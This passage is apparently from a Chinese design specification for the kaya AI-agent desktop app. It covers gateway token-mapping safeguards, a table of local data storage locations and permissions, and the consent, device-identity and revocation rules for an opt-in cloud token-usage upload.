- **卸载的额外边界**:只支持 npm/brew 管理的安装,且带归属校验(不是该管理器装的不卸,防误删手动安装);script(curl|bash)装的没有反向操作,工具直接拒绝并引导按官方文档手动卸载;卸载只移除程序本体,不碰配置文件与历史数据。面板侧「卸载」按钮另有确认对话框;chat 侧沿用「用户明确要求」约束,无授权卡片。
- **触发前提**:system prompt 硬约束「仅当用户明确要求时才 install/update/uninstall」;`install`/`update`/`uninstall` 只是把任务交给后台引擎后立即返回,完成与否由前端 toast 通知,动作本身落本地 App 日志(`~/.kaya/logs/`,含 agent、动作、渲染出的完整命令)。
- **安装输出行先脱敏(R3,2026-08-31)**:子进程 stdout/stderr 的每一行进尾部缓冲与前端事件前,先过与工具输出同级的 secret scrub(install hook 输出不可控,可能携带 token / 带凭据 URL)。

**既有占位符保护与映射唯一性(2026-10-26,spec §7.1)**:多轮对话历史会原样重放上一轮出站给上游的令牌。令牌若被自动规则二次令牌化,就会形成 `真值 → A → B` 令牌链(模型每轮看到不同替身,响应还原只能回到上一层)。故出站令牌化前先识别**既有占位符**并原样保留:
- 受保护候选 = ① 活跃 vault 与淘汰恢复历史里已有的自动生成 token(全量);② 用户令牌表中**本身会被自动规则命中**的目标 token。空 token、空白 token 与不会命中自动规则的普通别名不进受保护集合;普通别名只用于收集本请求的恢复引用。vault token、受保护用户 token 与普通别名分三层 Aho-Corasick LeftmostLongest 扫描,优先级依次降低;低优先级命中与高优先级 protected spans 重叠时丢弃,较早或更长的用户 alias 也不能遮蔽 vault token。请求引用与响应恢复共享边界:字母数字直接相连,或经 `._@-` 连接到另一侧字母数字时不认定为独立 token;独立句号、Markdown 下划线、独立连字符等句读不阻断。完整落在既有占位符内的自动命中被丢弃;外层 secret 命中若还覆盖占位符之外的内容,则以 `kaya_gateway_protected_secret_overlap` 拒绝请求(400,不转发上游)。
- `token → 真值` 必须唯一:用户配置在写入时拒绝(落盘前校验),运行期自动登记发现同一令牌指向不同真值时**fail-closed** —— 当前请求以固定哨兵 `kaya_gateway_token_conflict` 被拒(400,**不转发上游**),旧映射不被静默覆盖。冲突的 app_log 只记类别与 agent,**不记令牌 / 真值**;错误体同样不含令牌 / 真值。
- 不同令牌若按恢复边界存在包含或交叉重叠,也属于同一冲突:用户表写入、vault 登记和最终恢复快照分别校验,不能靠最长匹配猜真值。旧版本残留的歧义映射同样在上游前拒绝。
- 字面映射嵌入标识符时,保留指定替身并登记完整可恢复单元(如 `secret → prod` 在 `mysecret` 中生成 `myprod → mysecret`),同单元内多个命中合并为一条令牌化事实。单元扩展与引用/恢复共用左右边界,只吸收连接标识符的标点,留下句号、Markdown 下划线和独立连字符;普通与带句读形式可在同请求或跨请求并存。历史重放保护完整单元,不放宽短 token 的恢复边界,无关的更长标识符不会被误改。
- **还原快照合并恢复历史与用户令牌表**:还原快照 = 活跃 vault + 淘汰恢复历史 + 用户令牌表的反向映射;用户表条目**不占用**自动 vault 的淘汰池,也**不覆盖**既有映射(同令牌指向不同真值 → 同样 400 fail-closed)。

---

## 8. 本地数据存储

**本机状态都保存在用户机器上**,不自动云同步;登录后的使用情况心跳与经明确同意的云端 Token 用量上传是独立上传通道。

| 数据 | 位置 | 谁写 | 保留期 |
|---|---|---|---|
| UI 状态(消息 / 设置) | `localStorage` key `kaya` | 前端 Zustand persist | 用户主动清;**跨机对话(B 端)时,对端发来的请求原文与本机回答作为聊天消息落这里**(2026-10-20,Q2 本地回显,与飞书镜像同一口径);**设置页「配置优化」的内联分析回合消息带 `hiddenInChat` 标记照常持久化与审计,只是不在对话面板上屏**(2026-10-22,审计已记脱敏后正文,口径不变) |
| LLM 上下文 | `~/.kaya/conversations/c_*.json` | Rust `ConversationStore` | 用户主动清 |
| 审计日志 | `~/.kaya/audit/s_*/events-*.jsonl`(2026-10-08 起 0o600 原子创建 + 目录 0o700,旧 0644 文件追加时收紧——此前审计是唯一漏设权限的落盘域) | 前端 `recordEvent` (Rust 调 fs) | 用户主动清 |
| Debug capture(可选) | `~/.kaya/debug/s_*/turn-N.json` | Rust debug module | dev-only,默认关 |
| App 诊断日志 | `~/.kaya/logs/app-YYYY-MM-DD.jsonl` | Rust `app_log`(前端 `snapshotCursor` 光标诊断探针;2026-08-26 起渠道重连错误按变化去重落盘,tag `channel` —— Windows GUI 构建无 stderr,这是该平台唯一留痕) | 手动清理 7 天前(Settings → App 日志);文件 0o600;**内容仅诊断元数据**(DOM/CSS 状态、计数、字节长度;渠道连接错误文本含主机名/错误描述,URL query/fragment 已脱敏不落 ticket),不含 PTY 输出/键入/secret |
| 终端滚动历史 | `~/.kaya/terminal/<tabId>.log` | Rust scrollback append(round-89) | 10MB cap + truncate-to-75% 轮转;tab 关闭即删 |
| Per-tab shell 历史 | `~/.kaya/history/<tab_id>.history` | Rust per-tab HISTFILE(round-111);Windows 移植 Phase 2 起 Windows 会话为 PSReadLine `HistorySavePath`(per-tab init.ps1 注入,等价 HISTFILE 机制) | tab 关闭 merge 回全局历史(macOS 为 `~/.zsh_history`,Windows 为 kaya 自管的 `global.history`,见 `history/io.rs`);文件 0o600 |
| 登录令牌(refresh_token) | 系统钥匙串(macOS:2026-10-21 起统一条目 `com.kaya.byok` / `vault` 的 `authv:<variant>:refresh_token` 字段,全 secret 单 item = 启动至多 1 次钥匙串授权;Windows:variant service `com.kaya.auth` 等单条目,不变) | Rust `auth_tauri`(round-137/138,只写 refresh_token;2026-10-21 起经 `secret_tauri::auth_token_*` 落统一条目) | 登出 / 401 清理删除;access_token 不持久化(仅内存,15min TTL) |
| API Key(自备 key / 模型库 provider) | 系统钥匙串(macOS Keychain / Windows 凭据管理器;单条目 JSON map,字段名 `llm_api_key_<provider id>`;macOS 2026-10-21 起与登录令牌 / OAuth 同存统一条目 `com.kaya.byok` / `vault`) | `src/lib/secrets.ts`(`secret_set/delete/get`)+ Rust `secret_tauri`(白名单 `^[a-z0-9_]{1,64}$`)与 `model_library`(库 upsert 时吸收) | 用户主动清(删模型库 provider 连带删 key);**不落 localStorage、不落库文件** —— localStorage 只写空串 scrub(v30 起) |
| OAuth token 包(模型库 provider;access / refresh / expires_at / device_id / 仅 ChatGPT 可选 account_id) | 系统钥匙串(同一后端;macOS 2026-10-21 起为统一条目 `com.kaya.byok` / `vault` 的 `llm_oauth_<provider_id>` 字段(旧独立条目首读惰性迁移);Windows 维持**独立逻辑键** `llm_oauth_<provider_id>` + generation manifest + 分片 + 每片 SHA-256 不变(提交 manifest 是唯一原子切换点);命名空间 `com.kaya.byok` 默认**不分 region / variant** —— dev / intl 构建可读同一凭据,两个 variant 同时运行时互删凭据会互相踢下线;**WorkTree isolated dev profile 是显式例外**:`npm run tauri:dev:isolated` 的合法 debug profile 把登录令牌 / BYOK / OAuth / tavily / 渠道凭据统一放到 `com.kaya.byok.dev.<profile>` 与对应 dev auth service,不读取或迁移正式版 / 旧共享 dev 凭据,prod 条目与 namespace 不变) | Rust `secret_tauri::oauth_token_{get,set,delete}_sync`(由壳层 `provider_auth` / `provider_oauth` 调用) | 「退出登录」/ 删除 provider 即删除;refresh 被上游 401·403 拒绝只置**纯内存** expired 标记(token 包保留,重新登录覆盖);access token 另在 `AuthRuntime` 内存缓存(重启可靠 keychain 重读;临期 <300s 先 refresh);**不落 localStorage、不落库文件、不进 IPC / 日志 / 审计 / debug dump**;通用 `secret_get/set/delete` 显式拒收 `llm_oauth_*`。已知边界:refresh 成功后若 keychain 写入失败,新 token 只在内存(本进程继续可用),重启后 keychain 里可能是已被轮换作废的旧 refresh token → 需要重新登录(用户不会收到单独提示)；macOS 新版删除与 legacy 源清理在同一 vault 文件锁内，清理失败返回固定错误并可重试，不宣称登出完成；未知 schema 拒写，不清 legacy 源 |
| 统一模型库(provider 定义,**不含 key**) | `~/.kaya/model-library.json` | Rust `model_library`(命令 `model_library_list/upsert/delete`;Settings「模型」tab 与 Agents 面板同源读写) | 用户主动删;**v2(2026-10-16 供应商分层)两层结构:一个 provider 携带三个可选协议端点(chat / anthropic / openai,端点不含 key、不再带 model)+ 一份模型清单(`models`:模型 id + enabled / vision / protocols / capabilities / 网关别名 slug)+ provider 级 `extra_headers`(自定义出站头,值是准敏感数据:随本文件落盘 0o600,但绝不进 app_log / 审计 / debug dump / LLM 上下文 —— 见 §7.11 批次一新增面)**;v1 库文件(version 缺省 / `entries` 形状)首个库命令自动迁移(v2 + 顶层 `bindings` 改写,迁移前留底 `<store>.migrated-v1-<ts>`,copy 先留底再原子改写,非 rename;另有一项**一次性迁移**(2026-10-28)把旧在线发现写下的 auto 行协议白名单(`protocols:["chat"]` 等单元素形状)清成「继承 Provider 全部启用端点」,**有实际清理时**才留底 `<store>.migrated-protocols-<ts>`(同名不同前缀,与 v1 留底互不覆盖),留底同样 0o600、只留本机、用户可自行删除;没有模型行被清理时，库文件仍会因完成标记及 JSON 重排而重写，不额外保留这份专用整库副本;keychain 键 `llm_api_key_<m_id>` → `llm_api_key_<p_id>` 两阶段搬移:先写新键 → 提交 v2 库文件 → 再删旧键,崩溃或删旧失败最多留下孤儿旧键,**任一时点至少一份可用凭据,不丢 key**)。旧 `~/.kaya/agent-providers.json`(曾**明文**存 key)首启自动迁移:key 上收 keychain、原文件改名为 `agent-providers.json.migrated`(残留明文可由用户自行删除)。文件 0o600 原子写 + 旧权限收紧,复用 `write_with_backup`(即 2026-08-20 review C3 的同一实现) |
| 模型库 ↔ agent 绑定记录 | `~/.kaya/model-library.json` 顶层 `bindings` | Rust `model_library` 命令层编排(adopt / sync) | 用户主动删;provider 被删 / 绑定模型被摘 / 协议端点被摘掉即随之清除;**只存 `agent_id → {provider_id, model_id, via_gateway, kaya_managed?}` 映射,不含任何密钥**(2026-09-10 agent 绑定;2026-10-16 升级为 provider + model 两级) |
| IM 渠道会话映射 / 跨机 peer 设备映射 | `~/.kaya/channels/sessions.json` | Rust channels 模块(v2.1.0,IM 平台用户 ↔ 本机会话;2026-10-20 起同一文件另存跨机协同的设备 id ↔ `c_peer_<device_id>` 会话 id,只含元数据、不含消息正文) | 用户主动清 |
| IM 镜像目标 chat | `~/.kaya/channels/mirror.json` | Rust channels 模块(Unreleased,镜像绑定跨重启恢复) | 用户主动清(渠道运行中删除不会在原地重建,绑定跨重启恢复随之失效,重启后回退 sole_key 启发式) |
| 远程访问设备身份 | `~/.kaya/remote/device.json` | Rust remote 模块(2026-09-15,随机 ULID + 展示名 + enabled 持久化开关,0o600 原子写) | 用户主动清(删除后下次启用重新生成 device_id);**不含 token / ticket**(那些只在内存 / 钥匙串) |
| 跨机协同准入配置 | `~/.kaya/remote/peers.json` | Rust remote 模块(2026-10-15,协同总开关默认关 + 按设备白名单 / agent 圈定,0o600 原子写;损坏按默认关 fail-closed) | 用户主动清;**只存设备 id / 展示名 / 准入范围,不含任何密钥** |
| 跨机对话在途请求台账(peerHostRequests) | `localStorage` key `kaya` | 前端 Zustand persist(2026-10-20,persist v61 新增顶层切片;跨机在途台账从 `peerHostChat.ts` 的模块内存搬进 store —— 原实现被 Vite HMR 重求值 / 页面重载清空,回执静默丢失,占位消息永远停在「等待回复…」) | 在途请求终局或 TTL(10min)后自动出清;**只存 request_id / 设备 id / 设备展示名快照 / 占位消息 id / 时间戳,无正文**(展示名与占位消息文案早已随 messages 落盘,本切片不新增隐私面) |
| 定时任务(schedules) | `localStorage` key `kaya` | 前端 Zustand persist(v2.1.12,Settings → 定时任务) | 用户主动删;**prompt 以原文留存本机** |
| 记忆(核心/情景/自动变更台账/版本链) | `~/.kaya/memory/`(`core.json` / `state.json` / `review.jsonl` / `review-history.jsonl` / `episodic/YYYY-MM.jsonl` / `versions/<id>.jsonl` / `staging/`) | Rust memory 模块(2026-09-04,见 §8.1) | 记忆永久保留;丢弃走 tombstone 逻辑删除(留痕);**删除整个 `~/.kaya/memory/` 目录即彻底遗忘**;全部文件 0o600 原子写;**自动裁决只新增 / 强化 / 归纳 / 归档 / 回填可撤销的 `superseded_by`,不做物理删除**;`review.jsonl` 现在只服务存量自动迁移与技术重试 |
| 聊天临时图片(粘贴图片落盘) | `~/.kaya/tmp-images/<chat_session_id>/img_<uuid>.<ext>` | Rust attachments 模块(2026-10-02,粘贴图片 P2;0o600 原子写,session_id 白名单 `[a-zA-Z0-9_-]` 防路径逃逸) | **只活当次会话**:`/new` 删当次会话目录,app 重启 boot 清扫整个目录(不跨进程存活);用途是「发送给 agent」的路径交接(由被驾驶的编程 agent 自行读文件) |
| 跨 Agent ToDoList(todoList) | `localStorage` key `kaya` | 前端 Zustand persist(2026-09-21 跨 Agent ToDoList 重设计引入,v50;现 persist v64,取代 09-19 的 taskQueue slice) | pending/running/failed 条目用户主动删;**done 自 2026-10-10 起是持久状态:completedAt / verdictSummary / evidence 原文留存本机,完成区 FIFO 50 条**,直到用户「清空已完成」或逐条删除;**title / brief 等用户自有内容以原文留存本机**(与 tasks 投影同口径) |
| 模型网关(2026-10-13,§7.11) | `~/.kaya/gateway/`(`config.json` 端口持久化 / `owner.json` dev/prod variant 互斥锁 / `token.key` 内容寻址本机密钥 / `token-map.json` 用户令牌表 / `migrations.json` 迁移版本戳(只存一个整数版本号,零用户数据)) | Rust gateway 模块 + `gateway_tauri` 命令层 | 用户主动清;全部 0o600(原子写);`token.key` 删除 = 全量令牌失效(prompt 缓存 miss 一次,无内容泄露——真值不在令牌里);**令牌 → 真值的还原索引(vault)只在网关进程内存,永不落盘**;库条目的 API key 不进本目录(在系统钥匙串;网关启用期间**全量**条目 key 驻留网关进程内存,Phase 1.6 起) |
| PTY输入恢复序号 | WebView sessionStorage固定key kaya.pty.input-sequences.v1，最多128条 | 仅真实sessionId与十进制序号，不保存输入正文；Channel只返回固定结果码及可选high-water | 随WebView会话结束清除；元数据丢失时普通输入不自动重基，显式手动Ctrl+C才可恢复 |
| Agent Tune 脚本与 hook 状态(2026-10-14) | `~/.kaya/agent-tune/`(statusline / hook / notify 脚本,目录与脚本文件均 0o700)与 `~/.kaya/agent-state/<agent>-<session>.json`(0o600,同会话最新覆盖) | `agents::tune` 安装脚本;脚本由各家 agent 运行时触发(statusline 渲染 / hook 事件 / codex notify / opencode 插件)写状态文件(**2026-10-21 起 kimi-code 不再经 statusline 采集**——该条目已移除、官方内建 footer 交还,kimi 状态只经 hooks;claude-code statusline 不变);例外:opencode 插件文件(0o600)按 opencode 插件机制装进 opencode 自有插件目录,不在 agent-tune 下 | 脚本随「取消优化配置」从 agent 配置摘除引用(脚本文件本体留在 agent-tune,不被任何配置引用即惰性);状态文件无主动清理(单文件 <1KB,同会话覆盖写);**状态文件只含元数据**(agent_id / session_id / model / context_pct / cwd / event / ts),脚本契约明确**绝不写 prompt、消息文本、工具入参、文件内容**(codex notify payload 里的 message 字段解析后直接丢弃);读取侧 `agents::state_files` 只取 15min 内新鲜状态，忽略缺 session_id / unknown 的遗留共享条目；Python 缺会话时不读写状态文件。另有固定 `agent-tune/git-metadata-cache.json`（0o600，最多32项，正缓存5s/负缓存1s），仅存 cwd/root/git_dir/common_dir、定位时间与文件元数据指纹，不存 HEAD 正文、文件内容或 prompt；原子替换失败仅重新查询，缓存不增加任何网络出口 |
| agent 配置快照(2026-10-15,§8.2) | `~/.kaya/agent-config-snapshots/<agent_id>.json`(目录 0o700,文件 0o600 原子写) | Rust `agents::config_snapshot`(由模型库接入/撤除编排调用) | 接管首跳创建,撤除恢复成功即删;**内容含用户原值(含自配第三方网关的 base_url / token)**——「真实 key 不落盘」口径的明示例外,防护依赖 `~/.kaya` 域权限;快照内容绝不进日志/审计 |
| 网关隐私保护明细(2026-10-21,§8.4) | `~/.kaya/gateway/privacy-events.jsonl`(0o600) | Rust `gateway::privacy_log`(网关 server **按请求批量**写入;restore 滑窗命中补记) | schema v2(2026-10-26,九个可选诊断字段,旧行照读);90 天查询窗口 / tokenized **5000** 条 + warned **独立 500** 条双池上限(过期 → 重复旧记录 → FIFO 的淘汰顺序;过期数据的物理清除随 FIFO 压实或用户清空触发);满额**按批淘汰**(tokenized 一次腾 500 条 / warned 一次腾 50 条),设置页可清空当前筛选或全部(**选择性清空只清明细,全量清空再连带清请求与兼容事件**);**含令牌化原文与替换后令牌**——第二条内容落盘明示例外,防护依赖 `~/.kaya` 域权限;明细查询不主动外发(不进审计流 / app_log / debug dump,不自动注入 LLM;桌面/CLI 显式 trusted-read 沿用既有授权与输出 scrub;IM 渠道回合及跨机读取不可达) |
| 网关请求事件流(2026-10-26,§8.4) | `~/.kaya/gateway/request-events.jsonl`(0o600,目录 0o700) | Rust `gateway::request_log`(每条进入 `before_request` 的 Content 类请求恰好一条;`finish_once` 幂等 + Drop 兜底 `client_aborted`) | 30 天查询窗口 / 20000 条上限(满额批量淘汰最旧 1000 条后追加);**零内容**:只有 17 个结构化键(request_id / 时间 / app 与规则版本 / agent / 路由 / 协议 / 流式 / 改写字段数 / 类别计数 / 既有占位符 / 媒体保真与拒绝 / 精确恢复 / 结局 / 上游状态),结构上无原文、令牌、完整字段路径或消息体;与明细共用同一内部 `privacy` 开关;**全量清空连带清,选择性清空不动**;诊断导出排除 |
| 网关兼容诊断事件流(2026-11-03) | `~/.kaya/gateway/compatibility-events.jsonl`(0o600,目录 0o700) | Rust `gateway::compatibility_log`(签名 thinking 协议完整性拒绝时一条,与请求事件共享 request_id) | 30 天保留 / 5000 条上限(满额批量淘汰最旧 500 条并物理清除过期行);只有 15 个结构化键(schema / request id / 时间 / app 与规则版本 / agent / 路由 / 协议 / 固定协议字段路径 / 内容类型 / 命中类别 / 动作 / 决策原因 / 降级决策 / 重试结局),结构上无原文、令牌、真值、签名、base64、消息体或上游错误正文;与明细共用 `privacy` 开关;**全量清空连带清,选择性清空不动**;诊断导出排除本体及点后缀变体;只提供本机固定路径/打开命令,不上传 |
| Token 用量统计(2026-10-21) | `~/.kaya/usage/`(事件 JSONL,0o600;聚合仅在查询时内存计算,不落聚合文件) | Rust `usage_stats`(聊天 agent loop 与网关统一记账,`UsageMeter`) | 180 天保留;**只记计数与 provider / model / agent 标识,零内容**;**独立于 agent loop 的辅助调用**(快速决策命令 `llm_decide` / 任务提炼 / 记忆巩固)不计入统计;入口路由判定(`llm::decide::route_entry`,一次 3s 预算的轻量 LLM 调用,发生在 `usage_meter` 建立之前)同样不计入,`should_route_entry` 只是本地前置闸;**入口路由判定触发的瘦身回合仍在 agent loop 内,其用量照常计入** |
| 云端用量上传状态(2026-10-26;**2026-10-30 按部署分**) | `~/.kaya/usage/upload-<部署>.json`(cn / intl 各一份;0o600 原子写,目录 0700)+ `~/.kaya/usage/upload-<部署>.lock`(0o600 跨进程锁);旧版共享的 `~/.kaya/usage/upload.json` 作迁移源，双部署同源读回证明齐全后替换为无身份 tombstone | Rust `usage_upload_tauri`(命令层与后台 worker 写) | 常驻(关闭上传后不再推进同步游标 / 最近成功同步时间,但账号观察与身份隔离状态仍会更新;删除 `~/.kaya/usage/` 即失效);**只存上传游标、同意版本、账号/设备 id、桶粒度、回填隔离、事件下界、撤销 floor、授权证据代际、迁移 receipt、最近同步时间与供应商维度映射**——**不含 token / base_url / 供应商显示名 / 任何用量内容**;损坏按 fail-closed 停止上传 |
| App 版本元信息(显示用) | 内存(`AppInfo` runtime 字段,**不持久化**) | Rust `get_app_info`(`src-tauri/src/app_info.rs`,round-56) | 进程内,重启重读 |

**WorkTree isolated dev profile 的落点例外(2026-10-29)**:`npm run tauri:dev:isolated` 按 checkout 派生 profile id。该模式的 HOME、模型库、会话、终端历史、记忆、网关配置与请求/隐私事件分别落在 `~/.kaya-dev-home/profiles/<profile>/.kaya/` 对应子树,不是上表的正式版 `~/.kaya/`;登录令牌、BYOK API Key、OAuth token、tavily 与渠道凭据使用 `com.kaya.byok.dev.<profile>` 和对应 dev auth service。profile id 直接从 bundle identifier 后缀解析,env 缺失不会回退到正式版 vault;不读取或迁移正式版 / 旧共享 dev 凭据,prod 的条目、路径与 namespace 不变。deep-link 沿用已登记的 `kaya-dev`,真实 OAuth 登录与回跳在同机串行。

**旧共享状态迁移与退休**：CN/Intl 使用独立 `upload-cn.json` / `upload-intl.json` 与锁。迁移旧 `upload.json` 时，账号相等仅用于选择保守映射，不证明旧历史归属；账号不同则新设备、无同意/供应商映射，且继承已知撤销限制。旧源损坏或未来版本禁止建立默认目标；新版未来版本显示「请升级」，不推测旧程序的错误文案。

访问旧源的写路径统一先取旧共享锁再取目标锁。每个部署的迁移记录包含原始源字节 SHA-256、目标初始内容摘要、映射方式与 pending/verified 状态；先原子提交完整目标并真实读回，才提交 verified。中断只允许严格复验同源映射与未改变的 pending 内容后重试；既有目标没有 receipt 时绝不靠文件存在补造证明。退休另按旧共享→CN→Intl 顺序非阻塞取锁，只有两个有效目标的 verified receipt 均匹配当前同一源才原子替换旧文件为无账号/设备/映射的版本 tombstone。单部署、源变化、目标损坏/未来版本、读回不确定或锁忙均不据此宣布完成；可安全重试。tombstone 保留文件存在，使严格旧 reader fail-closed，避免缺文件被当成首次安装；不承诺磁盘取证擦除。正常目标后续授权修改保留迁移来源证明，无需再次读取旧身份。

- **可信状态与新同意**：本机 schema v2 使用稳定的授权证据代际。旧 schema v1 的开关、consent、原因字段无法证明历史归属，统一停传并取消旧同意；保留明确的换号/撤销限制，其余标为 `legacy_unverified`。普通重新同意默认只上传授权后的新用量；首次建立隔离下界时轮换 device id，保留旧设备已上传的累计桶。当前可信同账号的普通关闭后重开仍可回填关闭期间用量，同一设备累计值不得缩小。
- **独立历史授权**：`account_change` / `legacy_unverified` 需另点「回填最近 30 天历史」并确认；本机事件不含账号归属，历史可能包含以前账号期间的用量。普通开启和历史确认分别绑定预览时的部署、账号、登录及授权证据代际；后端等待在途操作后持文件锁复验。A→B→A 或代际改变会拒绝旧确认，零启用/零回填，刷新后重试；普通轮询不改变 scope。关闭上传不要求 scope。
- **不可放宽的撤销边界**：当前已撤销时无历史入口。明确重新同意后换新 device，并把持久 `revocation_floor` 提升至本次新授权起点；所有上传和历史回填下界均取它与其它范围的最大值。换号 A→B→A、普通开关、旧状态迁移及历史确认均不能抹掉或降低此界限；撤销前及撤销后未重新授权期间的用量永不补传。新授权窗口可在后续符合条件时单独授权回填，实际范围可能短于 30 天，界面显示限制日期。

**云端 Token 用量上传(2026-10-26,客户端已实现,默认关闭)**:kaya 客户端**内置**云端 Token 用量上传器,但**默认关闭** —— 未登录、或用户没有在设置页显式同意之前,**不产生任何摄入请求**(零上传)。用户在设置页「账户」→「云端 Token 用量」勾选开关后,会先展开一份「会上传 / 不会上传」的清单,点「确认并开启」才生效;同意版本记为 `kaya-usage-upload-v2`(写在本机状态文件里;**版本变更 ⇒ 旧同意作废,需重新确认一次**)。

- **上传内容**:按 UTC 小时或天聚合的**用量桶**。每个桶 = 来源(`chat` / `gateway`)+ agent 标识 + 归一化后的供应商键 + 模型 id + `prompt` / `completion` / `total` token 计数 + 请求次数。**桶值是累计值**(同一桶重复上传由服务端覆盖,不翻倍)。**设备 id 随每一批用量一起发送**(批次信封的 `device_id` 字段),用于服务端把用量归属到本设备。**设备注册 / 更新**(每轮**有桶**的同步开始前,向云端登记 / 更新这台设备的那一次请求)请求体共四个字段:设备 id、操作系统平台家族(`macos` / `windows` / `linux`)、kaya 应用版本、同意版本 —— 其中平台与应用版本**只随设备注册发送,不随用量桶发送**;**主机名与硬件指纹一律不上传**(平台只到 OS 家族一级)。注册请求是**幂等**的(同一设备重复登记只是更新),但它**每轮有桶的同步都会发一次**(不是只在首次同意时发一次)。
- **供应商键只有四种形状**(`preset:<preset_id>` / `builtin` / `cli` / `custom`)。**绝不上传** `p_` 开头的设备级 provider id、供应商自定义名称、`base_url`、自定义请求头、API Key 与 OAuth token。
- **归一化兜底只计数、本地 warn、零原文(2026-10-26)**:`provider_id` 既不是 `builtin` / `cli` / `custom`、也不是完整的 `p_[0-9a-f]{8}` 形状时归一为 `custom`(完整 `p_` 形状但模型库里没有带合法 `preset_id` 的条目是**正常**路径 —— 自定义供应商,同样归 `custom`,但**不算兜底、不计数**);`model_id` trim 后为空 / 超 200 字符 / 含控制字符时归一为 `default`。命中兜底的事件**只在同步日志里记计数**(`normalized_providers` / `normalized_models`,成功与失败两条路径都带,命中即该条升为 warn 级),**零原文、零逐条留痕** —— 兜底本身就是拦住「误填的 base_url / 超长自由文本」上云的闸。
- **绝不上传**:对话正文、文件内容与路径、仓库信息、当前工作目录(cwd)、主机名与硬件指纹、逐请求的原始事件记录。登录 JWT 只用于请求鉴权,**不写入上传内容**。
- **设备标识**:随机生成的 `d_` + 16 位小写 hex(本机生成并持久化,不采集任何硬件信息);云端撤销后**不自动换新**,只有用户显式重新同意才生成新设备标识;**被观察到的账号切换也会换新设备标识**(换身份 = 换设备身份,避免 A→B→A 时旧账号 / 新账号的数据互相覆盖)。**由此带来的两点如实说明**:① 同一台机器多次换账号后,**网站端的设备列表可能出现多个设备条目**(每个身份一个,历史条目仍在);② **撤销旧设备标识不会撤销之后换账号生成的新设备标识**(撤销只作用于被撤销的那一个)—— 不过每次换账号都会**作废旧 consent**,**未重新确认前本机零上传**。旧 schema v1 转换在首次明确新同意建立事件边界时同样轮换设备，避免缩小旧设备累计桶。
- **首次与回填上限**：没有旧上传状态的首次同意仍可回填最近 30 天，受本机记录、云保留期和当前授权窗口共同限制；无状态期间未被观察的换号无法识别，可能包含旧账号用量，预览明确披露。旧 schema v1 已有状态不适用此首次规则，按上文默认仅新用量。桶按新到旧累计上传，当前桶无需等整点，全部批次成功才推进游标。`retention_days` 钳至 180 天；零保留期为空窗口；明显不合理的云时钟拒绝使用。
- **账号观察**：即使关闭上传也跟踪当前登录账号。观察到换号即作废同意、换设备并隔离历史；明确历史授权的例外与不可放宽的撤销边界见上文。
- **账号切换 / 撤销**:被观察到的换账号后,默认不把旧账号历史传给新账号（单独历史确认仍受上述撤销边界约束）(重新同意后从**授权当下**开始传 —— 事件下界挡住旧账号区间,授权后的当前桶新数据立即可传;换账号同时**换用新的设备标识**,旧账号的已上传桶不受影响;未观察窗口见上条);云端撤销设备后客户端立即停止上传并显示「已撤销」,重新同意才恢复(生成新设备标识、只传新数据);撤销只作用于**被撤销的那一个**设备标识,之前换账号生成的新设备标识不受影响(但换账号已作废旧 consent,未重新确认前零上传)。发现账号已变后**不再发后续云端请求**(设备注册请求也在账号代际复核之后才发),也不把旧代际的结果写回状态。401 强制刷新后的重放同样在缓存新 token 与第二请求前复核取消与代际,缺守卫 fail-closed;取消统一按本轮跳过收尾。
- **关闭上传不删云端**:关开关只是停止本机后续同步,**不删除**已上传的数据(客户端没有云端 DELETE 路径);现有 Users DELETE 只软撤销，purge 只删用量桶且保留设备行；网站目前没有撤销按钮。历史设备列表清理仍需 Users/网站跨仓补齐，不宣称本次升级已清零。
- **本机游标状态**:上传游标、同意版本、账号绑定、设备 id、桶粒度、回填抑制原因、**事件下界**(`events_not_before` = **身份隔离**场景的授权当下)、最近成功同步时间与 `provider_key` 首见映射记在 `~/.kaya/usage/upload-<部署>.json`(cn / intl **各一份** —— 两套独立的云端与账号不得共用一份状态,否则账号 id 来回翻转会被判成「换账号」;目录 0700 / 文件 0600 / 原子写);同机多进程用 `~/.kaya/usage/upload-<部署>.lock` 加锁(锁覆盖「锁内重读状态 → 聚合 → 全部 HTTP → 写回游标」全程);状态文件损坏或读错误一律 fail-closed(停止上传,不重建后继续传)。失败**不推进游标**,下一轮重试同一批。游标在**同步轮内单调不减**;**唯一例外**是「重新授权处的隔离重定基」(游标从「下一桶」拉回当前桶起点,让授权后的当前桶立即可传)—— 隐私边界由**事件下界**承担,不是靠游标。**本机用量文件读不动**(权限 / 目录占位 / I/O 错误)与「某一行写坏了」是**两件事**:前者让**整轮失败**(零摄入、零游标推进),并按可重试错误退避后自动重试(不会把一整天的数据悄悄漏掉);后者只丢那一行,其余桶照常上传。**本机模型库读不动**(损坏 / 读错误 / 结构非法)同样让**整轮失败**(零摄入、零游标推进)—— 供应商维度映射(`provider_key` 归一)不确定时不得发桶;从上传器视角这是**本机瞬时 I/O 故障**,按**可重试**错误退避后自动重试(不是永久错误、不会停掉自动同步)。
- **诊断日志**:本机 app_log 只记**固定错误码与计数**(批数 / 桶数 / 接受数 / 写入数 / 丢弃数 / 跳过数 / 归一化兜底计数),**不记**桶内容、时间戳、账号、供应商名、模型清单或文件路径;命中归一化兜底(见上)时该条升为 warn 级,内容仍只有计数。
- **调度**:后台 worker 每 60 秒检查一次开关 / 账号 / 退避到期 / 网络恢复;两条实际同步之间**兜底**间隔 ≥5 分钟。**退出前补发**:应用退出前 `drainBeforeClose` 会 best-effort 触发一次 `usage_upload_sync_now`,与其他退出收尾共享 10 秒 drain 上限;失败不阻止退出,未登录 / 未同意 / 已撤销时零网络。**用量事件驱动(2026-10-26)**:聊天 / 网关的用量事件**成功落盘后**即唤醒 worker,经 ~5 秒 trailing debounce 合并连续事件后**近实时**上传(不受 5 分钟兜底间隔限制);写失败不触发。事件路径**不绕过**任何闸门:退避阶梯 / 自动暂停 / 等登录代际 / 未同意 / 已撤销一律照旧生效,未登录 / 未同意 / 已撤销时**零网络**。上传在途期间到达的新事件记为待办,本轮结束后自动补一轮(不丢通知、不并发上传)。「近实时」**不是硬实时保证**:一轮聚合窗口的上界取云端 `coverage.server_time`,刚在该上界之后写入的事件由**后续轮次的游标窗口**补传(桶是累计值)⇒ 不丢。同意 / 账号变化 / 手动同步仍是**立即**唤醒,不受 debounce 影响;**重新同意 / 换账号后**运行时闸复位,不会被「两次实际同步 ≥5 分钟」挡住。跨进程锁被占用(同机另一个 kaya 进程正在同步)按**常态竞争**处理 —— 自动路径本轮跳过、**不记错误、不进退避阶梯**,待办保留、后续自然重试;手动同步会在状态里显示该错误码(用户看得见「另一个 kaya 进程正在同步」),但同样不进退避阶梯,可立即重试。**有效窗口下界(游标 / 保留边界 / 